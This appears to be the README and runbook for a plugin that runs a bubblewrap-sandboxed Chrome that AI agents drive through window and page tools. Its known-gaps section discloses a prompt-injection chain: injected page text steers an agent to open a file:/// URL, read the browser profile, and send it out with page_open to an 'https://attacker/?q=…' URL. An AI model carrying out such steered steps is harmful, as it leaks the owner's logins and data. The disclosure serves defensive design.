# Desktop plugin

A real Google Chrome on this host, inside a headless Wayland compositor. The
owner watches and uses its window live in a Report `window` block; agents read
and drive the same window with five tools. Design: issue #2530,
`docs/architecture/2530-agent-desktop.md`.

There is no GPU and no FFmpeg/PipeWire/GStreamer. Chrome always runs inside a
bubblewrap (`bwrap`) sandbox, so the `bubblewrap` package must be installed.
Chrome is not bundled: installing it is a step of this runbook.

## How it works

`desktop` is one process, spawned by the kernel's plugin host. It wires three
libraries together and speaks only the plugin protocol:

- `compositor`: a headless Wayland server; its socket lives in the plugin's
  private `run/` directory.
- `chrome-control`: launches Chrome on that display with a persistent profile
  and an allowlisted environment, and drives the visible tab over CDP on a
  pipe (no debugging port).
- `sandbox`: the bwrap policy Chrome runs inside (see [Sandbox](#sandbox)).
- `window-stream`: streams one window as JPEG frames over a WebSocket and
  carries the viewer's pointer and keys back.

The kernel reaches the stream through the manifest's `http_socket`
(`http.sock`, a Unix socket) behind its session- and origin-gated route
`/api/plugins/desktop/ws/…`. Neither `desktop` nor Chrome listens on TCP.

Chrome starts on the first demand: a viewer of the stream, or `page_open`. It
stops when the plugin stops:

- stdin EOF (the kernel went away) or SIGTERM: `desktop` asks Chrome over CDP
  to close (`Browser.close`), as closing its last window does, so Chrome
  writes its cookies (a page whose main thread is busy can still lose its
  last one); if it has not exited after five seconds its sandbox gets
  SIGTERM, which ends the sandbox at once, and two seconds later the
  sandbox's process group gets SIGKILL;
- a SIGKILL of `desktop`, which is what the kernel's plugin stop, disable,
  reload and server restart send: bwrap dies through `PR_SET_PDEATHSIG`, its
  init through `--die-with-parent`, and the kernel ends every process left in
  the sandbox's pid namespace, Chrome and its helpers. Nothing is written in
  order then, so cookies set in the last seconds before it can be lost (see
  the known gaps).

If the owner closes Chrome's last window, the app is not running until the
next demand. A viewer always shows the app's newest open window: when Chrome
opens another window (a login popup), the stream switches to it, and back
when it closes.

Files, all under `<plugins_data_dir>/desktop/` (directories 0700):

| Path | What |
|---|---|
| `run/<pid>-<tag>/wayland-0` | this process's Wayland socket (0600) |
| `http.sock` | the stream socket (0600) |
| `profiles/chrome/` | Chrome's profile: cookies and logins (`/data/profile` inside the sandbox) |
| `home/` | Chrome's `HOME`: crash database, NSS state (`/data/home` inside) |

The profile survives plugin, server and host restarts.

## Sandbox

Chrome never runs outside a bwrap sandbox (#2565). Inside it, Chrome sees
only fixed paths, none of which mirror a host path:

| Inside | What | Access |
|---|---|---|
| `/opt/chrome` | the directory holding `chrome_binary` (after links) | read-only |
| `/data/profile` | `profiles/chrome/` | read-write |
| `/data/home` | `home/`, Chrome's `HOME` | read-write |
| `/run/wayland/wayland-0` | this process's Wayland socket | connect |
| `/usr`, `/bin`, `/sbin`, `/lib`, `/lib64` | system programs, libraries and fonts | read-only |
| `/etc` | only `fonts/`, `ssl/certs/`, `resolv.conf`, `hosts`, `nsswitch.conf`, `localtime` and `ld.so.cache` | read-only |
| `/proc`, `/dev`, `/tmp`, `/dev/shm` | its own: a fresh proc, minimal devices, private tmpfs | |

Everything else, the user's home, repositories, `~/.codex`, the service's
env file and the rest of the plugin's data directory, does not exist for
Chrome: a `file://` URL to it shows Chrome's "ERR_FILE_NOT_FOUND" page. Chrome
gets its own user, mount, pid, IPC, UTS and cgroup namespaces, a new session,
and `PATH=/usr/bin`; it shares the host's network (see the known gaps).
Chrome's own sandbox still runs inside it.

Two host channels remain visible inside:

- Chrome inherits `desktop`'s stderr, so `file:///dev/stderr` (or
  `/proc/self/fd/2`) reads it. Under the kernel that is a pipe and reads
  nothing, but when `desktop` runs with stderr redirected to a file (a manual
  run), that host file is readable.
- `/proc` belongs to the sandbox's pid namespace, so no host process is
  listed, but host-wide files such as `/proc/net/*` exist (they read empty
  through `file://`).

**One profile, one Chrome.** Chrome's own profile lock does not work across
sandboxes: Chrome is pid 2 in each, with a private `/tmp`, so a second
sandboxed Chrome takes the lock over instead of handing off. What keeps two
Chromes off the profile is `desktop`: a new process waits until the old
`http.sock` stops answering, and the old sandbox dies with the old process.
Never run two `desktop` processes on one data directory by hand.

Keep Chrome in a directory of its own: everything beside `chrome_binary` is
visible to Chrome.

Requirements:

- bubblewrap at `bwrap_binary` (default `/usr/bin/bwrap`; Debian and Ubuntu
  package `bubblewrap`);
- unprivileged user namespaces: `sysctl kernel.unprivileged_userns_clone` is 1
  where that knob exists, and on Ubuntu 24.04 or later
  `kernel.apparmor_restrict_unprivileged_userns` is 0 (or an AppArmor profile
  lets bwrap create them);
- a merged-`/usr` host (`/bin`, `/lib` and `/lib64` link into `/usr`).

It fails closed. Without an executable `bwrap_binary` the plugin refuses its
`initialize`, so the kernel reports it failed to start. A sandbox that cannot
start (no user namespaces, for example) makes `page_open` and the stream fail
with "Chrome exited during launch"; Chrome never runs in its place.

## Tools

The kernel serves them as `plugin_desktop_<tool>`.

| Tool | Does | Result |
|---|---|---|
| `window_ls` | lists the open windows and the apps | `windows[{window_id, app, title, width, height}]`, `apps[{app, running, src}]` |
| `window_cat {window_id}` | screenshots one window, after letting it draw (under a second) | a PNG image block plus `{window_id, title, width, height}` |
| `window_input {window_id, events[]}` | clicks, moves, scrolls, key chords (`ctrl+l`) and US-ASCII text | `{ok: true}` |
| `page_open {url}` | opens an http(s) URL in the visible tab; starts Chrome | `{url, title, loaded}` |
| `page_cat` | the visible tab's text, cut at 100000 characters | `{url, title, text, text_truncated}` |

Page titles and urls are the page's to choose; every one a tool returns is cut
at 1000 and 4096 characters.

A closed window is `-32404`, and Chrome not running is `-32503`; neither ever
returns an older result. `page_*` refuse with `-32409`, naming every tab, when
no tab or more than one tab may be visible (see the known gaps).

`window_input` and `page_open` reach the open web, so their annotations
truthfully say `openWorldHint: true`. They also declare `"approval":
"delegated"` (manifest version 7): enabling the plugin is the owner's grant,
and the kernel then lets Codex Planner and Worker threads run them without
asking, in threads that start after the refresh that follows the enable (about
a second; #2530 E3c, `docs/plugin-security.md`). Disabling the plugin
withdraws the grant. The three views are read-only and never asked.

## Install Chrome (no apt packages)

Pick one, as the service user. Neither needs root.

**Google Chrome stable**, unpacked rather than installed:

```sh
mkdir -p ~/.local/opt/google-chrome && cd ~/.local/opt/google-chrome
curl -fLO https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
dpkg -x google-chrome-stable_current_amd64.deb .
./opt/google/chrome/chrome --version
```

`chrome_binary` is then `~/.local/opt/google-chrome/opt/google/chrome/chrome`
(the real binary, not the `google-chrome` wrapper script), as an absolute
path. Updates are manual: repeat the steps.

**Chrome for Testing**, from <https://googlechromelabs.github.io/chrome-for-testing/>:
unzip `chrome-linux64.zip` and use `chrome-linux64/chrome`.

Chrome links against system libraries even on Wayland: NSS (`libnss3`,
`libnspr4`), ATK, CUPS, `libdrm`, `libgbm`, `libxkbcommon`, Pango, Cairo,
`libasound`, D-Bus, `libexpat` and the X11/xcb family. They must already be
present; check that nothing is missing:

```sh
ldd <chrome_binary> | grep 'not found'   # must print nothing
```

Chrome's sandbox and bwrap need unprivileged user namespaces (see
[Sandbox](#sandbox)).

Chrome for Testing 151 shows a closable "unsupported command-line flag" bar
(about 56 px) for `--disable-blink-features=AutomationControlled`, which keeps
`navigator.webdriver` false for the owner's own logins. Check whether Google
Chrome stable shows it too, and close it once.

## Build and install the plugin

```sh
cargo build --release --locked -p desktop --bin desktop
dir=~/.local/share/neige-next/plugins-src/desktop-$(git rev-parse --short HEAD)
mkdir -p "$dir/bin"
cp plugins/desktop/manifest.json "$dir/"
cp "${CARGO_TARGET_DIR:-target}/release/desktop" "$dir/bin/"
```

Then, against the server:

```sh
curl -X POST "$CALM/api/plugins/install" -H 'content-type: application/json' \
  -d "{\"source\":{\"kind\":\"local_path\",\"path\":\"$dir\"}}"
curl -X PATCH "$CALM/api/plugins/desktop/config" -H 'content-type: application/json' \
  -d '{"chrome_binary":"/home/<user>/.local/opt/google-chrome/opt/google/chrome/chrome"}'
curl -X POST "$CALM/api/plugins/desktop/enable"
```

A plugin is disabled until enabled. While `chrome_binary` is unset the kernel
does not start it and reports the missing key.

## Configuration

| Key | Default | Meaning |
|---|---|---|
| `chrome_binary` | required | absolute path of the Chrome executable |
| `bwrap_binary` | `/usr/bin/bwrap` | absolute path of bubblewrap, which Chrome always runs inside |
| `width`, `height` | 1280, 800 | the window size; every window is maximized to it |
| `max_fps` | 15 | frame rate of a watched window; an unwatched one draws once a second |
| `proxy_server` | unset | `<scheme>://<host>:<port>` (http, https, socks4, socks5) for every Chrome request |

Chrome's environment is an allowlist, so it never sees the service's
`https_proxy`. On a host that reaches the web only through a proxy (X among
others), set `proxy_server` to that proxy, for example
`http://127.0.0.1:2080`, or the owner's login cannot load. Unset, Chrome
connects directly; loopback addresses are never proxied.

A change takes effect after `POST /api/plugins/desktop/reload`.

## Show Chrome in a Report

Add a `window` block whose `src` is the app's `src` from `window_ls`:

```json
{ "op": "upsert", "kind": "window",
  "payload": { "src": "/api/plugins/desktop/ws/apps/chrome/stream", "title": "Chrome" } }
```

The block shows Chrome's main window (its most recent open window), starting
Chrome if needed. Click into it to type; keys go to Chrome until you click
outside. While Chrome or the plugin is stopped, the block shows "unavailable".

## Owner's first login (A10)

The MVP's last acceptance is manual, on the owner's own account:

1. Enable the plugin, with `proxy_server` set if this host needs a proxy to
   reach x.com, and open a Report with the Chrome `window` block. Note
   whether Google Chrome stable shows the "unsupported command-line flag" bar,
   and close it.
2. In the block, click the address bar, open `x.com` and log in. A login
   popup (Google sign-in) replaces the block's picture while it is open.
3. Wait at least 60 seconds: Chrome writes cookies in batches, and a plugin
   stop is a SIGKILL.
4. Restart the plugin (`POST /api/plugins/desktop/reload`), then restart the
   server. Reopen the Report: the X timeline is still logged in.
5. Ask an agent to call `page_open https://x.com/home`, summarize the timeline
   with `page_cat`, and show it with `window_cat`. Note whether the model
   received the image (unverified, see below).
6. A4 on Google Chrome stable. With Chrome running, record the launch:

   ```sh
   D=$(pgrep -f -- "/bin/desktop$")                    # the plugin process
   B=$(pgrep -P "$D" -x bwrap)                         # its sandbox
   pstree -p "$B" | grep -o '([0-9]*)' | tr -d '()' > /tmp/a4-sandbox.txt
   wc -l < /tmp/a4-sandbox.txt                         # bwrap, its init, Chrome, helpers
   ```

   Disable the plugin (`POST /api/plugins/desktop/disable`), wait 5 seconds,
   and run `ps -o pid=,args= -p "$(paste -sd, /tmp/a4-sandbox.txt)"`: it must
   print no process.

Record the result in the PR.

## Known gaps

- **Same user.** Agents and Chrome run as the same OS user. The sandbox keeps
  Chrome away from the user's files, but not the other way round: any local
  process of that user can read the profile, and a Worker's shell can reach
  `http.sock`. It is no boundary against local code of the same user.
- **Tool scope.** The tools appear on every unbound Track for the Planner and
  Workers. Narrowing to bound Tracks is one manifest field
  (`agent_tools_scope: "bound-track"`).
- **Approval is delegated.** `page_open` and `window_input` run without a
  prompt in Codex Planner and Worker threads that start after the refresh
  following the owner's enable, also under the Planner's asking tier, so page
  text that steers a model can drive them (prompt injection). Codex 0.159.2
  also applies the grant to loaded threads at the kernel's reload. Disabling
  the plugin is the off switch.
- **A steered agent can still read what the sandbox holds and send it out,
  unasked.** With delegation, nothing stops this chain: an injected page makes
  the agent type `file:///…` with `window_input`, read it with `page_cat`, and
  send it with `page_open https://attacker/?q=…`. The sandbox narrows what
  that reaches to Chrome's own files (see [Sandbox](#sandbox)): the user's
  home, repositories and secrets are not there, but the profile is
  (`file:///data/profile/`), and with it the browser's logins. Before
  delegation, the two write steps were each asked (refused under `never`; the
  Planner's `full` tier approves prompts anyway), and `page_cat` was never
  asked.
- **`page_open` takes web URLs only, but that is no boundary.** It refuses
  `file:`, `chrome:` and other schemes, yet `window_input` can type any
  address into Chrome's address bar, `file:///` included, and `page_cat` then
  reads it, within the sandbox.
- **Accounts.** A steered agent acts as the owner on every site the profile
  is logged in to (X, Google). The sandbox does not cover that; it needs
  approval prompts or tool scoping.
- **Network.** The sandbox shares the host's network namespace until #2565 S2.
  Pages and typed URLs reach all of loopback TCP (the kernel's API included)
  and the LAN; only Chrome's Local Network Access
  checks stand between them, and `window_input` can click through their
  prompts. Sharing the network namespace also shares the host's abstract Unix
  sockets, which no mount hides: on the 4140 host, root's Xvfb
  (`@/tmp/.X11-unix/X99`, which needs an X cookie Chrome does not have) and
  exim's `@/var/spool/exim4/exim_daemon_notify`. Chrome's own code is what
  would connect to them; pages cannot open Unix sockets.
- **Prompt injection.** Page text reaches models. Disabling the plugin is the
  immediate off switch.
- **A stop can lose the last cookies.** The kernel stops a plugin with
  SIGKILL, so a login made seconds before a plugin stop, reload or server
  restart can be lost; only stdin EOF and SIGTERM close Chrome in order, and
  even then a page whose main thread is busy can lose its last cookie. Wait
  60 seconds after a login before any stop.
- **The last session comes back.** On the next launch, after an orderly stop
  or a SIGKILL, Chrome usually restores the last session (a SIGKILL right
  after a change can bring back the session from before it): its windows and
  tabs reopen and their pages load again, which repeats whatever a page's GET
  does (`--hide-crash-restore-bubble` only hides the "Restore pages?" bubble). A
  session left with a popup open comes back with two windows, and `page_*`
  refuse with `-32409` until one is closed.
- **Window churn ends sessions.** A new window of the app, or closing the
  window a viewer streams, ends that viewer's session so it reconnects to the
  newest window; a page that keeps opening and closing popups makes the Report
  block reconnect over and over, and the viewer backs off up to 10 seconds
  between empty sessions.
- **Shared seat.** The owner's and the agents' input interleave; the last
  input wins.
- **Model image receipt unverified.** Whether Codex or Claude pass the
  `window_cat` image to the model is unknown; the text tools alone satisfy the
  MVP.
- **One visible tab, fail closed** (#2547). `page_*` act only when exactly one
  tab is visible and none fails to answer. A tab that cannot answer within two
  seconds (an `alert()`, a crashed or frozen tab, a main thread busy for long
  on this GPU-less host) blocks every `page_*` call until it is closed or
  reloaded; the error names it. A second window or a popup does the same.
- Non-ASCII input and IME (use `page_open` for URLs), clipboard, audio, file
  chooser dialogs, downloads UI, notifications, resizing and HiDPI, popups
  larger than their window (clipped).
- A server restart or deploy restarts Chrome; the last session is restored
  (see above) and logins stay.
- Chrome install and updates are manual. Linux only, with bubblewrap and
  unprivileged user namespaces.
